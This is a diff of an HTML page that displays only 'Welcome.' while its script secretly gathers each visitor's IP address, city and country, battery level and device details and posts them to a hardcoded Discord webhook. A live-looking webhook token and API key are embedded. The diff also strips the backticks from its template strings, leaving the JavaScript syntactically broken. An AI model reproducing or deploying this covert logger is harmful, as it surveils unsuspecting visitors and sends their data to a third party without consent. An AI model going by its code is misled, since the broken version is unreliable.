@@ -11,12 +11,11 @@
             color: #ffffff;
             font-family: Arial, sans-serif;
             text-align: center;
+            height: 100vh;
             margin: 0;
-        }
-
-        .content {
-            padding: 20px;
-            min-height: 150vh; /* Added for scrolling demonstration */
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         h1 {
@@ -27,9 +26,7 @@
 </head>
 
 <body>
-    <div class="content">
-        <h1>Welcome.</h1>
-    </div>
+    <h1>Welcome.</h1>
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
 
@@ -42,14 +39,14 @@
 
         function getLocation(ip) {
             const apiKey = 'ipl_live_TrMYUZ4xSg3eTqWeS3fkWz1mZhG45lOq9fFGI7mD';
-            return fetch(`https://api.iplookupapi.com/v1?apiKey=${apiKey}&ip=${ip}`)
+            return fetch(https://api.iplookupapi.com/v1?apiKey=${apiKey}&ip=${ip})
                 .then(response => response.json())
                 .catch(error => console.error('Error fetching location:', error));
         }
 
         function getBatteryInfo() {
             if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
+                return navigator.getBattery().then(battery => ${(battery.level * 100).toFixed(0)}%);
             } else {
                 return Promise.resolve('Battery info not available');
             }
@@ -61,10 +58,10 @@
             const language = navigator.language;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
-            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const screenResolution = ${window.screen.width}x${window.screen.height};
             const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
 
-            return `
+            return 
                 User-Agent: ${userAgent}
                 Platform: ${platform}
                 Language: ${language}
@@ -72,7 +69,7 @@
                 Mobile Device: ${isMobile}
                 Screen Resolution: ${screenResolution}
                 Screen Orientation: ${screenOrientation}
-            `;
+            ;
         }
 
         function sendToDiscord(ip, location, battery, deviceInfo) {
@@ -86,7 +83,7 @@
                         { name: "Battery Level", value: battery, inline: true },
                         { name: "Device Info", value: deviceInfo, inline: false }
                     ],
-                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
+                    footer: { text: Logged at ${new Date().toLocaleString()} }
                 }]
             };
 
@@ -107,7 +104,7 @@
             .then(([ip, battery]) => {
                 const deviceInfo = getDeviceInfo();
                 getLocation(ip).then(location => {
-                    const locationInfo = location ? `${location.city}, ${location.country_name}` : 'Unknown';
+                    const locationInfo = location ? ${location.city}, ${location.country_name} : 'Unknown';
                     sendToDiscord(ip, locationInfo, battery, deviceInfo);
                 });
             });
